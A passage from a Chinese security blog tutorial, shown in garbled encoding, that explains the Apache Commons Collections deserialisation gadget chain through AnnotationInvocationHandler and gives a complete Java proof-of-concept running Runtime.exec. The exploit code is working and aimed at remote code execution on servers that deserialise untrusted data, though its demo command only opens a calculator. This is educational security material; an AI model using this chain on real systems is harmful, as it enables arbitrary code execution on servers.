<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>â€‹    è¦æƒ³è°ƒç”¨ <strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong> æ–¹æ³• , ç¬¬ä¸€æ­¥è¦è¾¾æˆå¦‚ä¸‹ä¸‰ä¸ªæ¡ä»¶ .</p>
<ol>
<li><p><strong>var5 = AbstractInputCheckedMapDecorator$MapEntry</strong></p>
</li>
<li><p><strong>!var7.isInstance(var8)</strong></p>
</li>
<li><p><strong>!(var8 instanceof ExceptionProxy) == True</strong></p>
</li>
</ol>
<p>â€‹    <strong>var7</strong> çš„å€¼é€šè¿‡ <strong>var3.get(var6)</strong> è¿”å› , ä¸”ä¸èƒ½ä¸ºç©º .</p>
<p>â€‹    <strong>var6</strong> å’Œ <strong>var8</strong> çš„å€¼æ¯”è¾ƒå¥½çœ‹ , åˆ†åˆ«é€šè¿‡ <strong>var5.getKey()</strong> æ–¹æ³•å’Œ <strong>var5.getValue()</strong> æ–¹æ³•è·å– <strong>var5</strong> çš„é”®åä¸å€¼.</p>
<p>â€‹    var5 æ˜¯ var4.next() æ–¹æ³•è¿”å›çš„ , æ ¹æ®ä¸Šæ–‡çš„å†…å®¹ , æˆ‘ä»¬å¸Œæœ› var4 ä¸º <strong>AbstractInputCheckedMapDecorator$EntrySetIterator</strong>å®ä¾‹å¯¹è±¡.</p>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>â€‹    ä»ç¬¬ä¸€æ­¥çš„ç»“æœæ¥çœ‹ , æˆ‘ä»¬éœ€è¦çŸ¥é“ <strong>var3</strong> å’Œ <strong>var4</strong> çš„èµ‹å€¼è¿‡ç¨‹ .</p>
<p>â€‹    1. <strong>Iterator var4 = this.memberValues.entrySet().iterator()</strong></p>
<p>â€‹    2. <strong>Map var3 = var2.memberTypes();</strong></p>
<p>â€‹    <strong>var4</strong> æ˜¯ <strong>this.memberValues.entrySet().Iterator()</strong> æ–¹æ³•è¿”å›çš„ , å¯¹æ¯”å‰é¢çš„ POC , æˆ‘ä»¬æœŸæœ› <strong>this.memberValues</strong> æŒ‡å‘ <strong>TransformedMap</strong> .</p>
<p>â€‹    <strong>var3</strong> æ˜¯ <strong>var2.memberTypes()</strong> æ–¹æ³•è¿”å›çš„ , æˆ‘ä»¬è·Ÿè¸ªè¯¥æ–¹æ³• .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-090501.png"
                      alt="image-20230420170500512"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-090625.png"
                      alt="image-20230420170624983"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-090846.png"
                      alt="image-20230420170846133"
                ></p>
<p>â€‹    é€šè¿‡å‡ æ­¥è·³è½¬ , å¯ä»¥ç¡®å®šè¿™é‡Œ <strong>var3</strong> æ˜¯ä¸€ä¸ª <strong>HashMap</strong> , å› æ­¤ä¸Šæ–‡ <strong>var3.get()</strong> å°±æ˜¯è°ƒç”¨ <strong>HashMap.get()</strong> æ–¹æ³•.</p>
<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>â€‹    ç°åœ¨éœ€è¦å…³æ³¨ <strong>this.memberValues</strong> ä¸ <strong>var2</strong> çš„å€¼äº† . å…¶ä¸­ <strong>var2</strong> çš„èµ‹å€¼å¦‚ä¸‹ :</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-151426.png"
                      alt="image-20230420231425787"
                ></p>
<p>â€‹    ä¸ºäº†ç¡®å®š <strong>this.type</strong> å’Œ <strong>this.memberValues</strong> çš„å€¼ , æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å½“å‰ç±»æ„é€ å‡½æ•°çš„å®šä¹‰ .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-151818.png"
                      alt="image-20230420231818011"
                ></p>
<p>â€‹    <strong>AnnotationInvocationHandler</strong> çš„æ„é€ å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç±»å‹ä¸º Map , è¿™ç‚¹éå¸¸å·§ , æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ <strong>TransformedMap</strong> å®ä¾‹å¯¹è±¡.</p>
<p>â€‹    var1æ˜¯ä¸€ä¸ªæ³¨è§£ç±»</p>
<p>â€‹    <strong>æ³¨æ„ : è¿™é‡Œ var1 , var2 æ˜¯æ„é€ å‡½æ•°çš„å½¢å¼å‚æ•° , å¹¶é readObject() æ–¹æ³•ä¸­çš„ var1 å’Œ var2ï¼</strong></p>
<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>â€‹    <strong>å†æ¬¡æ³¨æ„ï¼Œè¿™é‡Œ var1 , var2 æ˜¯ readObject() æ–¹æ³•ä¸­çš„å½¢å¼å‚æ•°.</strong></p>
<ol>
<li>æ„é€ å‡½æ•° <strong>AnnotationInvocationHandler.AnnotationInvocationHandler()</strong></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-155400.png"
                      alt="image-20230420235400614"
                ></p>
<p>â€‹    è¿™é‡Œ <strong>this.type</strong> è¢«èµ‹å€¼ä¸º <strong>java.lang.annotation.Retention</strong></p>
<ol start="2">
<li><strong>var2 = AnnotationType.getInstance(this.type)</strong></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-160238.png"
                      alt="image-20230421000237811"
                ></p>
<p>â€‹    ç»è¿‡è¿™æ­¥èµ‹å€¼ , var2 å®ä¾‹å¯¹è±¡ä¸­çš„ memberTypes å‚æ•°å˜ä¸ºä¸€ä¸ª HashMap , å…¶ä¸­å­˜åœ¨é”®å€¼å¯¹ : {â€œvalueâ€ : â€œjava.lang.annotation.RetentionPolicyâ€}</p>
<ol start="3">
<li><strong>Class var7 = (Class)var3.get(var6)</strong></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-160524.png"
                      alt="image-20230421000523246"
                ></p>
<p>â€‹    è¿™é‡Œè°ƒç”¨äº† var3.get(var6) , å¹¶å°†ç»“æœèµ‹å€¼ç»™å˜é‡ var7 , var3 æ˜¯ä¸€ä¸ª HashMap , var6 å€¼ä¸º â€œvalueâ€ , æ‰€ä»¥å®é™…æ‰§è¡Œçš„æ˜¯ HashMap.get(â€œvalueâ€) . è€Œ var3 ä¸­æ°å¥½å­˜åœ¨åä¸º â€œvalueâ€ çš„é”®å , å› æ­¤å¯ä»¥æŠŠ â€œvalueâ€ çš„å€¼ â€œjava.lang.annotation.RetentionPolicyâ€ , èµ‹å€¼ç»™å˜é‡ var7.</p>
<p>â€‹    è¿™æ ·å˜é‡ var7 å°±ä¸ä¸ºç©ºäº† , è‡ªç„¶é€šè¿‡äº†ä¸‹æ–‡ if (var7 != null) çš„æ¡ä»¶åˆ¤æ–­ .</p>
<ol start="4">
<li><strong>ç»¼ä¸Šæ‰€è¿° , ç”±äºå˜é‡ var6 çš„å€¼ä¸º value , å› æ­¤å˜é‡ var7 å¯ä»¥è·å–åˆ°å€¼å¹¶é€šè¿‡ä¸‹é¢çš„æ¡ä»¶åˆ¤æ–­ . è€Œ var6 çš„å€¼åˆæ˜¯é€šè¿‡ var5.getKey() è·å–çš„ , è€Œ var5 å°±æ˜¯æˆ‘ä»¬ä»£ç ä¸­åˆ›å»ºçš„ HashMap</strong></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-161917.png"
                      alt="image-20230421001916896"
                ></p>
<p>â€‹    å› æ­¤è¿™é‡Œä¹Ÿå¼•å‡ºäº†è¯¥ POC åˆ©ç”¨æˆåŠŸçš„ä¸€ä¸ªæ ¸å¿ƒè¦æ±‚ : æ‰‹å·¥åˆ›å»ºçš„ HashMap çš„é”®åå¿…é¡»ä¸º Value .</p>
<p>â€‹    ç›¸å , å¦‚æœè¿™é‡Œ HashMap çš„é”®åè¢«èµ‹äºˆå…¶ä»–å€¼( ä¾‹å¦‚ â€œmes9s0â€ ) , é‚£ä¹ˆæ­¤å¤„å°†æ‰§è¡Œ HashMap.get(â€œmes9s0â€) , å“ˆå¸Œè¡¨ä¸­ä¸å­˜åœ¨è¿™ä¸ªé”®å , å› æ­¤ var7 ä¼šè¢«èµ‹å€¼ null , ä¸ä¼šé€šè¿‡ä¸‹é¢çš„ if æ¡ä»¶åˆ¤æ–­ .</p>
<ol start="5">
<li>åé¢å°±æ²¡å•¥å¥½è¯´çš„, ç¨‹åºå°†æ‰§è¡Œåˆ° <strong>var5.setValue()</strong> , å³æ‰§è¡Œ <strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong> æ–¹æ³• , è¿›å…¥æ¶æ„å‡½æ•°è°ƒç”¨é“¾ .</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162200.png"
                      alt="image-20230421002159675"
                ></p>
<p>â€‹    è‡³æ­¤ , å½“æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»åœ¨è¿œç¨‹æœåŠ¡å™¨é€šè¿‡ <strong>readObject()</strong> æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–æ—¶ , ä¼šè‡ªåŠ¨è°ƒç”¨ <strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong> æ–¹æ³• , è¿›å…¥æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„å‡½æ•°è°ƒç”¨é“¾ , æœ€ç»ˆæ‰§è¡Œä»»æ„ä»£ç  .</p>
<h2 id="ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡ŒPOC"><a href="#ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡ŒPOC" class="headerlink" title="ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡ŒPOC"></a>ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡ŒPOC</h2><p>â€‹    ç°åœ¨å¯ä»¥æ„é€ å®Œæ•´çš„ POC äº† . æˆ‘ä»¬ä»…éœ€è¦è·å– <strong>AnnotationInvocationHandler</strong> å®ä¾‹å¯¹è±¡ , å¹¶å‘æ„é€ å‡½æ•°ä¸­ä¼ å…¥Retentionç±» ä¸ TransformedMapå®ä¾‹å¯¹è±¡ , å³å¯å®ç°POPæ”»å‡»é“¾è‡ªåŠ¨è°ƒç”¨ .</p>
<p>â€‹    éœ€è¦æ³¨æ„çš„æ˜¯ , <strong>AnnotationInvocationHandler</strong>ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨äº†é»˜è®¤ä¿®é¥°ç¬¦ , é€šè¿‡é»˜è®¤ä¿®é¥°ç¬¦ä¿®é¥°çš„æ–¹æ³•åªèƒ½åŒåŒ…è®¿é—® , å› æ­¤è¿™é‡Œæ— æ³•ç›´æ¥è®¿é—® .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162411.png"
                      alt="image-20230421002410602"
                ></p>
<p>â€‹    è¿™é‡Œä¸è·å– <strong>java.lang.Runtime</strong> å®ä¾‹å¯¹è±¡çš„æ€è·¯ç±»ä¼¼ , å³é€šè¿‡åå°„æ¥è·å–ç±» , é€šè¿‡ **getDeclaredConstructor()**æ–¹æ³•è·å–æ„é€ å™¨ , é€šè¿‡ <strong>setAccessible()</strong> æ–¹æ³•æ¥å¼€æ”¾æ„é€ å™¨è®¿é—®æƒé™.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162441.png"
                      alt="image-20230421002440460"
                ></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">highPoc_transform</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//æ­¤å¤„Tranformeræ•°ç»„é‡Œé¢çš„å€¼æ˜¯ä¸‰ä¸ªå¯¹è±¡ï¼Œæ˜¯å› ä¸ºChainedTransformeré‡Œå¯ä»¥å¾ªç¯è°ƒç”¨ï¼Œå¹¶æŠŠä¸Šä¸€å±‚ä¼ ç»™ä¸‹ä¸€å±‚</span></span><br><span class="line">                <span class="comment">//ä¼ å…¥Runtimeç±»</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//pass</span></span><br><span class="line">                <span class="comment">/*åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œ</span></span><br><span class="line"><span class="comment">                è¿”å›Runtime.getRuntimeæ–¹æ³•</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œ</span></span><br><span class="line"><span class="comment">                è¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        org.apache.commons.collections.<span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        transformerChain.transform(&quot;mes9s0&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        //æ­¤å¤„å¾€ä¸‹ä¸ºæœ¬åœ°POCï¼Œæ— æ³•è¿œç¨‹ååºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">        //åˆ›å»ºMapå¹¶ç»‘å®štransformerChain</span></span><br><span class="line"><span class="comment">        Map innerMap = new HashMap();</span></span><br><span class="line"><span class="comment">        //åˆå§‹åŒ–HashMap</span></span><br><span class="line"><span class="comment">        innerMap.put(null,null);</span></span><br><span class="line"><span class="comment">        //è°ƒç”¨decorate()æ–¹æ³•</span></span><br><span class="line"><span class="comment">        Map outerMap = TransformedMap.decorate(innerMap,null,transformerChain);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        //è§¦å‘æ¼æ´</span></span><br><span class="line"><span class="comment">        //è·å–AbstractInputCheckedMapDecorator$MapEntry</span></span><br><span class="line"><span class="comment">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span></span><br><span class="line"><span class="comment">        onlyElement.setValue(&quot;mes9s0&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ins</span> <span class="operator">=</span> cons.newInstance(java.lang.annotation.Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(out);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162558.png"
                      alt="image-20230421002557913"
                ></p>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>æœ¬æ–‡æ ‡é¢˜ï¼šJavaå®‰å…¨ä»é›¶åˆ°ä¸€(8)-Commons Collections POP Gadget Chainsç®€ä»‹</li>
        <li>æœ¬æ–‡ä½œè€…ï¼šmes9s0</li>
        <li>åˆ›å»ºæ—¶é—´ï¼š2023-02-18 10:48:53</li>
        <li>
            æœ¬æ–‡é“¾æ¥ï¼šhttps://mes9s0.github.io/2023/02/18/Javaå®‰å…¨ä»é›¶åˆ°ä¸€-8-Commons-Collections-POP-Gadget-Chainsç®€ä»‹/
        </li>
        <li>
            ç‰ˆæƒå£°æ˜ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/%E5%BC%80%E5%8F%91/">#å¼€å‘</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/Java/">#Java</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/%E5%AE%89%E5%85%A8/">#å®‰å…¨</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/CC/">#CC</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/POP-Gadget-Chains/">#POP Gadget Chains</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2023/03/10/%E5%85%B3%E4%BA%8EWindows%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">å…³äºWindowsåè®®å­¦ä¹ </span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2023/01/30/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-7-Java-RMI%E7%9B%B8%E5%85%B3/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Javaå®‰å…¨ä»é›¶åˆ°ä¸€(7)-Java RMIç›¸å…³</span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;è¯„è®º</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'VOW0hvnes0uKAXRkVyEuVvR4-9Nh9j0Va',
                    appKey: '46zItzkbXxcS29wD64JlGikD',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: 'ğŸ˜œ å°½æƒ…åæ§½å§~',
                    lang: 'zh-CN'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return 'åšä¸»';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'mes9s0';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2022</span>
              -
            
            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">mes9s0</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
